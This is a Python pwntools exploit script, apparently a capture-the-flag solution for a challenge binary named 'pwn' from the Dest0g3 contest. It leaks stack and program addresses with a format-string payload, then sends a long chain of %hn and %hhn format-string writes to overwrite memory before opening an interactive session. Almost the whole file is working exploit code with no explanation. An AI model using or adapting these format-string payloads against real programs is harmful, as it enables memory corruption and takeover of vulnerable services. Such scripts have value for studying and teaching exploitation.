#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "node4.buuoj.cn:28273"
remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b, timeout=10)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    lg("p.pid")
    input()
    # pass

debugPID()
ru(b'What about your love to Dest0g3?\n')
sl(b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
rcvs = ru(b'\n', "drop").split(b".")
for i in range(len(rcvs)):
	try:
		rcvs[i] = int(rcvs[i], 16)
	except Exception as e:
		# print(e)
		continue

elf_base = rcvs[0] - 0x4060
stack_of = rcvs[10] - 0x108

print(rcvs)
lg("elf_base")
lg("stack_of")



target = stack_of + 7
payload = b'%'+ str(target&0xffff).encode() +b'd%11$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)


target = 0xff
payload = b'%'+ str(target&0xff).encode() +b'd%39$hhn\x00'

# irt()

ru(b'What about your love to Dest0g3?\n')
sn(payload)


# target = elf_base + 0x4010
target = stack_of +  0x108 + 0x8 + 0x4
payload = b'%'+ str(target&0xffff).encode() +b'd%11$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)

target = elf_base + 0x4010
# target = 0xdeadbeef
# payload = b'%'+ str(((target&(0xffff << 0xc)) >> 0xc)).encode() +b'd%39$hn\x00'
payload = b'%'+ str(((target&(0xffff << 0x20)) >> 0x20)).encode() +b'd%39$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)


target = stack_of +  0x108 + 0x8 + 0x2
payload = b'%'+ str(target&0xffff).encode() +b'd%11$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)

target = elf_base + 0x4010
payload = b'%'+ str(((target&(0xffff << 0x10)) >> 0x10)).encode() +b'd%39$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)

target = stack_of +  0x108 + 0x8
payload = b'%'+ str(target&0xffff).encode() +b'd%11$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)

target = elf_base + 0x4010
payload = b'%'+ str(target&0xffff).encode() +b'd%39$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)

target = 0x140ED8
payload = b'%'+ str(target&0xffff).encode() +b'd%40$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)

target = 0x12
payload = b'%'+ str(target&0xff).encode() +b'd%39$hhn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)
target = 0x14
payload = b'%'+ str(target&0xff).encode() +b'd%40$hhn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)


target = stack_of + 7
payload = b'%'+ str(target&0xffff).encode() +b'd%11$hn\x00'
ru(b'What about your love to Dest0g3?\n')
sn(payload)
target = 0x00
payload = b'%'+ str(target&0xff).encode() +b'd%39$hhn\x00'

# irt()

ru(b'What about your love to Dest0g3?\n')
sn(payload)

# debugPID()
irt()